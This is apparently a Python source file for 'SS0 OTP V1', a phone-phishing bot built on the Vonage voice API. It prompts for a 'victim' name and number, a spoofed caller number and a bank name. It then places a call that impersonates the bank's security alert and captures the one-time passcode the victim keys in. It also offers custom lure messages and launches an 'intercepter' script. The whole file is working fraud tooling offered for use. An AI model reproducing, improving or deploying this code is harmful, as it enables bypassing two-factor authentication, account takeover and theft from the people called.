import os
import time

from custom import CustomCall
from pyfiglet import figlet_format
from vonage import Ncco, InputTypes, vonage
dir_ = os.getcwd()


f = open('pk.txt', 'r')
pkr = f.read()

client = vonage.Client(
    application_id="ea55251a-a664-4a4c-bd16-4b847217e1a9",
    private_key=pkr,

)
voice = vonage.Voice(client)

logo = figlet_format("SS0 OTP V1", font='standard')
logo2 = figlet_format("LETS GET EM", font="standard")


def main_menu():
    while True:
        print(logo)
        print("MADE BY:50SHINE \n vonage api v1 \n \n")
        print(" 1.MAKE A CALL \n 2. SETTING ")
        usr = input(">>> ")
        if usr == '1':
            os.system("clear")
            print(logo2)
            while True:
                print(" this is the default script \n listen to this before you use Custom!! \n 1.BANK \n ""2.Custom call \n 0.BACK ")
                usr1 = input(">>> ")

                if usr1 == '1':
                    os.system("clear")
                    call_info()
                    call_()

                if usr1 == "0":
                    os.system("clear")
                    main_menu()

                if usr1 == 'clear':
                    os.system('clear')

                if usr1 == '2':
                    em = open(dir_+'/err_msg/msg1.txt', 'r')
                    emr = em.read()
                    print(emr)
                    time.sleep(10)
                    cc = CustomCall(msg1=input("FIRST MSG: "),
                                    msg2=input("SECOND MSG:"),
                                    from_number=input("FROM NUMBER: "),
                                    number=input("NUMBER TO CALL: "))
                    cc.ncco_()
                    cc.call_()
                    os.system("python3 intercepter.py")

        if usr == '2':
            os.system("clear")
            while True:
                usr3 = input(">>> ")
                print('1.REC ON/OFF ')
                if usr3 == "1":
                    yn1 = input("TYPE YES OR NO TO TOGGLE: ")

                    if yn1 == "ON" or "on":
                        pass




def call_info():
    global number
    global vic_name
    global msg1
    global msg2
    global msg3
    global bank_name
    global from_number

    vic_name = input("NAME OF VICTIM: ")
    number = input("NUMBER TO CALL: ")
    from_number = input("NUMBER TO CALL FROM: ")
    bank_name = input("WHATS THE BANK NAME: ")
    os.system("clear")

    msg1 = f"hello {vic_name}, this is an {bank_name} automated security alert," \
           f"Someone is attempting to access your {bank_name} account, " \
           f"if this was not you, press 1."

    msg2 = f"{vic_name}, to stop this request, please enter the one-time passcode we sent " \
           f"to your device, followed by the pound sign."

    msg3 = f"thank you {vic_name} this request has been stopped. for more info vist {bank_name}dot com"


def make_bait():
    global bank1
    ip1 = Ncco.Input(type=['dtmf'], dtmf=InputTypes.Dtmf(timeOut=5, maxDigits=1, submitOnHash=True))
    ip2 = Ncco.Input(type=['dtmf'], dtmf=InputTypes.Dtmf(timeOut=10, maxDigits=16, submitOnHash=True))
    talk1 = Ncco.Talk(text=msg1, bargeIn=True, loop=1, level=0.4, language='en-GB', style=5, premium=True)
    talk2 = Ncco.Talk(text=msg2, bargeIn=True, loop=1, level=0.4, language='en-GB', style=5, premium=True, timeout='5')

    bank1 = Ncco.build_ncco(talk1, ip1, talk2, ip2, )


def call_():
    make_bait()
    response = client.voice.create_call({
        'to': [{'type': 'phone', 'number': number}],
        'from': {'type': 'phone', 'number': from_number},
        'ncco': bank1,

    })

    os.system("python3 intercepter.py")
